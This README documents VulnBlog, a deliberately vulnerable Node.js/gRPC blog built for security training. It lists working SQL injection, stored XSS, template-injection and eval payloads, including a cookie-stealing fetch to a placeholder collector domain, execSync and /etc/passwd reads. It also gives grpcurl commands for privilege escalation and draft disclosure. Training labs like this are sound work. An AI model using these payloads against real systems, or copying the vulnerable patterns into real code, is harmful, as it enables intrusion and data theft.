# VulnBlog 


## Overview

VulnBlog is a deliberately vulnerable Node.js blog platform designed for hands-on web security training. It exposes five classic OWASP vulnerability classes through a realistic dual-transport API: a binary **Protobuf over HTTP/1.1** endpoint and a **gRPC** interface, both backed by the same SQLite database and business logic.

If you are intrested, please also checkout [gRPC Goat](https://github.com/rootxjs/grpc-goat)

---

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                    Docker Container                  │
│                                                      │
│   app.js              grpc_server.js                 │
│   HTTP :3000          gRPC  :50051 (plaintext)       │
│   POST /api/proto     gRPCS :50052 (TLS)             │
│        │                    │                        │
│        └──────┬─────────────┘                        │
│               │                                      │
│          handlers.js  (shared business logic)        │
│               │                                      │
│         better-sqlite3                               │
│         /data/vulnblog.db  (Docker volume)           │
│                                                      │
│   public/index.html  (Browser SPA)                   │
└──────────────────────────────────────────────────────┘
```


## Seeded Accounts

| Username | Password | Role |
|----------|----------|------|
| `admin` | `s3cr3tAdm1n!` | ADMIN (2) |
| `alice` | `alice123` | AUTHOR (1) |
| `bob` | `bob456` | GUEST (0) |

Roles: `GUEST=0` (read-only), `AUTHOR=1` (can create posts/comments), `ADMIN=2` (sees drafts, full access).

---

## Vulnerability Map

| # | Name | Vulnerable Field(s) | Handler |
|---|------|---------------------|---------|
| 1 | **SQL Injection** | `LoginRequest.username/password`, `SearchRequest.tags` | `handleLogin`, `handleSearch` |
| 2 | **Stored XSS** | `Post.body`, `Comment.content` | `handleCreatePost`, `handleCreateComment` |
| 3 | **SSTI (RCE)** | `Post.template` → unsandboxed Nunjucks | `handleCreatePost` |
| 4 | **NoSQL/eval Injection** | `FilterCommentsRequest.filter` → `new Function()` | `handleFilterComments` |
| 5a | **Broken Access Control — Role Escalation** | `UpdateProfileRequest.author.role` written to DB unchecked | `handleUpdateProfile` |
| 5b | **Broken Authentication + Logic Issue — Draft Post Disclosure** | `ListPostsRequest.minRole` trusted from client; no auth check on unauthenticated callers | `handleListPosts`, `handleSearch` |

---

## Quick Start

### Prerequisites

- [Docker](https://docs.docker.com/get-docker/)
- [grpcurl](https://github.com/fullstorydev/grpcurl) 
- [GRPC-UI](https://github.com/fullstorydev/grpcui) 

Download and extract the zip

```bash
git clone https://github.com/0wa1s/VulnBlog.git

```
### Start the Application

```bash
docker compose up -d --build
```

Services come up on:

| Transport | Address |
|-----------|---------|
| Browser SPA + Protobuf API | `http://localhost:3000` |
| gRPC (plaintext) | `localhost:50051` |
| gRPC (TLS) | `localhost:50052` |

Visit `http://localhost:3000` to use the browser interface.

---


## Vulnerability Details

### 1. SQL Injection
**Where:** `handlers.js` → `handleLogin` and `handleSearch`

Both `username` and `password` in `handleLogin` are interpolated directly into the SQL string with no parameterisation:

```js
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

The `tags` field in `handleSearch` is also raw:

```js
if (tags) sql += ` AND p.tags LIKE '%${tags}%'`;
```

**Example payloads:**
```
Login bypass:    username = admin'--
OR bypass:       username = ' OR '1'='1'--
Colum Enum:      tags = x%' order by 5 -- -
Extract Db Version:       tags= %x' union select '1','2','3','4','5','6','7','8','9',sqlite_version() -- -
Dump Data: tags= x%' UNION SELECT id,username,password,email,'t',1,'t',1,'now',bio FROM users --
```

---

### 2. Stored XSS 

**Where:** `handlers.js` → `handleCreatePost` (`post.body`) and `handleCreateComment` (`comment.content`)

Both fields are stored raw with no sanitisation and later reflected as `innerHTML` in the browser SPA.

**Example payloads:**
```html
<!-- Post body -->
<img src=x onerror="alert('XSS')"/>

<!-- Comment content -->
<script>fetch('https://COLLAB_DOMAIN/log?token='+sessionStorage.getItem('vb_token'))</script>
```

**To trigger:** After running the script, open `http://localhost:3000` and browse to each created post.

---

### 3. SSTI 

The rendered output is returned in `ApiResponse.message`.

**Example payloads:**
```
Detection:    {{7*7}}
Env dump:     {{ range.__proto__.constructor('return JSON.stringify(process.env)')() }}
RCE (id):     {{ require('child_process').execSync('id').toString() }}
Read file:    {{ require('fs').readFileSync('/etc/passwd', 'utf8') }}
```

Requires an AUTHOR or ADMIN session token.

---

### 4. NoSQL / eval Injection 

**Where:** `handlers.js` → `handleFilterComments` (`filter` field)

The filter expression is executed server-side using `new Function()` with `this` bound to each comment row, and `require`/`process`/`global` injected as arguments:

Filter would once there are comments posted on a post.

```js
const fn = new Function('require', 'process', 'global', `return (${filter})`);
if (fn.call(row, require, process, global)) matched.push(row);
```

This mirrors MongoDB's `$where` operator. Error messages are reflected verbatim, enabling data exfiltration via `throw new Error(data)`.

**Example payloads:**
```js
// Legitimate use
this.author === 'alice'

// Detection
typeof process

// Exfiltration via thrown error
(function(){ throw new Error(JSON.stringify(process.env)) })()
(function(){ throw new Error(require('fs').readdirSync('/app').join(', ')) })()

// RCE
(function(){ throw new Error(require('child_process').execSync('id').toString()) })()
```

No authentication required.

---

### 5a. Broken Access Control — Role Escalation

**Where:** `handlers.js` → `handleUpdateProfile`

The browser UI renders the role field as disabled, but that control exists only in the frontend. The underlying Protobuf field `Author.role` is fully writable — any client that speaks the binary protocol can set it to any integer. Authentication is present; what is absent is authorisation over what values the authenticated user is permitted to write.

**Attack — any authenticated user can self-promote to ADMIN:**

```json
{
  "sessionToken": "<bob's GUEST token>",
  "author": { "id": 3, "username": "bob", "email": "bob@vulnblog.local", "bio": "...", "role": 2 }
}
```

Sending `role=2` in the Protobuf message promotes bob from GUEST to ADMIN in a single request. The response contains a fresh session token reflecting the new role. Once escalated, bob can list all drafts, create and delete posts, and read credentials stored in the unpublished post #5.

**grpcurl example:**
```bash
# Step 1 — get bob's token
BOB_TOKEN=$(grpcurl -plaintext -import-path . -proto blog_service.proto \
  -d '{"username":"bob","password":"bob456"}' \
  localhost:50051 blog.VulnBlogService/Login \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['loginResult']['sessionToken'])")

# Step 2 — escalate to ADMIN by writing role=2 directly in the Protobuf
grpcurl -plaintext -import-path . -proto blog_service.proto \
  -d "{\"sessionToken\":\"$BOB_TOKEN\",\"author\":{\"id\":3,\"username\":\"bob\",\"email\":\"bob@vulnblog.local\",\"bio\":\"escalated\",\"role\":2}}" \
  localhost:50051 blog.VulnBlogService/UpdateProfile
```


---

### 5b. Broken Authentication + Logic Issue — Unauthenticated Draft Disclosure 

**Where:** `handlers.js` → `handleListPosts` and `handleSearch`

This vulnerability has two compounding flaws: a **logic error** and a **missing authentication check**.

**Flaw 1 — Logic error: role resolution uses client input as fallback.**

The server determines which posts to show based on the caller's role. The intended design is: authenticated ADMINs see all posts; everyone else sees only published ones. The actual code is:

```js
function handleListPosts({ minRole, category, sessionToken }) {
  const sessionUser = resolveSession(sessionToken);

  // VULN BAC: minRole is trusted directly from the client.
  const role = sessionUser ? sessionUser.role : resolveRole(minRole);
  ...
}
```

When no valid session token is provided, instead of defaulting to the lowest privilege level (GUEST, role 0), the code falls through to `resolveRole(minRole)` — which reads the `minRole` value straight from the request. This makes the privilege level a client-controlled input rather than a server-enforced property.

**Flaw 2 — Missing authentication check: unauthenticated callers reach the privileged branch.**

There is no guard that requires a session before the elevated role path is taken. The `published=1` filter is only applied when `role < 2`, so an unauthenticated request that supplies `minRole=ADMIN` (integer `2`) will skip the filter entirely:

```js
let sql = role >= 2
  ? "SELECT p.*,u.username FROM posts p LEFT JOIN users u ON p.author_id=u.id WHERE 1=1"
  : "SELECT p.*,u.username FROM posts p LEFT JOIN users u ON p.author_id=u.id WHERE p.published=1";
```

Combined, these two flaws mean any caller — with no token at all — can retrieve every unpublished draft by setting `minRole=ADMIN` in the request body. Post #5 ("Internal Admin Notes — DO NOT PUBLISH") contains plaintext admin credentials and the database passphrase.

**Attack — list all drafts without any authentication:**

```json
{ "minRole": "ADMIN", "category": "", "sessionToken": "" }
```

The same bypass applies to `handleSearch` via `SearchRequest.minRole`.

**grpcurl example:**
```bash
# No token — unauthenticated. Post #5 with credentials will appear in the response.
grpcurl -plaintext -import-path . -proto blog_service.proto \
  -d '{"minRole":"ADMIN","category":"","sessionToken":""}' \
  localhost:50051 blog.VulnBlogService/ListPosts

# Same bypass on Search
grpcurl -plaintext -import-path . -proto blog_service.proto \
  -d '{"query":"internal","tags":"","minRole":"ADMIN","sessionToken":""}' \
  localhost:50051 blog.VulnBlogService/Search
```

---

## API Reference

The API uses a single Protobuf envelope (`ApiRequest` / `ApiResponse`) transported over `POST /api/proto` with `Content-Type: application/x-protobuf`.

The API has reflection enabled so simply use [GRPC-UI](https://github.com/fullstorydev/grpcui) to load all methods and messages, alternatively download the `.proto` file from web app itself

The `.proto` files are served by the application itself:
```
http://localhost:3000/blog.proto           # Message definitions
http://localhost:3000/blog_service.proto   # Full annotated service reference
```

### grpcurl Quick Reference

```bash
# Download protos from the running server
curl -o blog_service.proto http://localhost:3000/blog_service.proto
curl -o blog.proto         http://localhost:3000/blog.proto

GRPC="grpcurl -plaintext -import-path . -proto blog_service.proto"

# FOR Intercepting request of GRPC export proxy settings
export HTTP_PROXY=IP:PORT
export HTTPS_PROXY=IP:PORT

# use TLS so burp can intercept the traffic properly as currently burp has issues with H2C

# GRPC="grpcurl -insecure -import-path . -proto blog_service.proto"




# Login
$GRPC -d '{"username":"alice","password":"alice123"}' localhost:50051 blog.VulnBlogService/Login

# List published posts
$GRPC -d '{"minRole":"GUEST","category":"","sessionToken":""}' localhost:50051 blog.VulnBlogService/ListPosts

# Search
$GRPC -d '{"query":"protobuf","tags":"","minRole":"GUEST"}' localhost:50051 blog.VulnBlogService/Search

# Get post with comments
$GRPC -d '{"postId":1,"sessionToken":""}' localhost:50051 blog.VulnBlogService/GetPost

# Filter comments (JS expression)
$GRPC -d '{"postId":1,"filter":"this.author === '\''alice'\''"}' localhost:50051 blog.VulnBlogService/FilterComments

# Create post (requires AUTHOR token)
$GRPC -d '{
  "sessionToken": "<token>",
  "post": {"title":"Test","body":"<p>Hi</p>","category":"Tech","tags":"test","published":true}
}' localhost:50051 blog.VulnBlogService/CreatePost
```

---

## Docker — Reset and Fresh Start

### Start the application 
```bash
docker compose  up -d
```

### Stop the application (keep data)

```bash
docker compose down
```

###  Full Reset — Wipe Everything and Start Fresh

Use this when you want a completely clean slate: all exploit-injected posts, comments, escalated roles, and session tokens are cleared, and the database is re-seeded with the original three users and five posts.

```bash
docker compose down -v && docker compose up -d
```






